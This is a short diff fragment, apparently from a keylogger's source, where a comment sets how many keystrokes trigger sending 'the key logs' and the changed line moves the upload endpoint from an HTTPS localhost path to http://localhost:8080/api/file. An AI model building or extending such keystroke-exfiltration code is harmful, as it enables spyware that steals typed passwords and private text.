@@ -20,7 +20,7 @@
 
 
 #define AMOUNT_CHARS 25 //How many keystrokes are needed to send the key logs
-#define PATH "https://localhost/api/file"
+#define PATH "http://localhost:8080/api/file"
 
 
 
